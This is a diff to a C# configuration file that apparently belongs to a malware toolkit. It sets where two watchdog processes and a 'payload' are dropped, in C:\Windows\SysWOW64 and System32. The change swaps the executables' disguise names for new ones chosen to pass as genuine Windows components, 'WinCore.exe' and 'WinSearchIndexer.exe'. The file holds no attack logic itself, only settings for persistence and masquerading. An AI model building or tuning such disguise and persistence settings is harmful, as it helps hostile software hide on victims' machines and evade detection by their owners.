@@ -1,4 +1,5 @@
 ﻿
+
 public class Config // This is for Binary 2
 {
     // Put the config at the top of this file that you want to run. the commented out one should be below for the powershell script
@@ -24,13 +25,12 @@ public class Config // This is for Binary 2
 
 
     public static string PrimaryWatchdogPath { get; private set; } = @"C:\Windows\SysWOW64\"; // CRUCIAL: This is the foler you will be put both watchdogs and the payload into
-    public static string PrimaryWatchdogName { get; private set; } = "Windows Service Scheduler.exe";
+    public static string PrimaryWatchdogName { get; private set; } = "WinCore.exe";
     public static string PrimaryWatchdogMutexName { get; private set; } = "PrimaryWDogBin2";
     public static string PrimaryWatchdogFullPath { get; private set; } = Path.Combine(PrimaryWatchdogPath, PrimaryWatchdogName);
 }
-
-
 /*
+
 public class Config // This is for Binary 1
 {
 	public static bool Debugging { get; private set; } = false; //Set to true for debugging messages and logs
@@ -46,8 +46,8 @@ public class Config // This is for Binary 1
 
 
 
-    public static string SecondaryWatchdogPath { get; private set; } = @"C:\Windows\SysWOW64\"; // This will be created if it doesnt already exist
-    public static string SecondaryWatchdogName { get; private set; } = "Windows Disk Management.exe";
+    public static string SecondaryWatchdogPath { get; private set; } = @"C:\Windows\System32\"; // This will be created if it doesnt already exist
+    public static string SecondaryWatchdogName { get; private set; } = "WinSearchIndexer.exe";
     public static string SecondaryWatchdogMutexName { get; private set; } = "SecondaryWDog";
     public static string SecondaryWatchdogFullPath { get; private set; } = Path.Combine(SecondaryWatchdogPath, SecondaryWatchdogName);
 
@@ -57,4 +57,5 @@ public class Config // This is for Binary 1
     public static string PrimaryWatchdogMutexName { get; private set; } = "PrimaryWDog";
     public static string PrimaryWatchdogFullPath { get; private set; } = Path.Combine(PrimaryWatchdogPath, PrimaryWatchdogName);
 }
- */
+ 
+*/
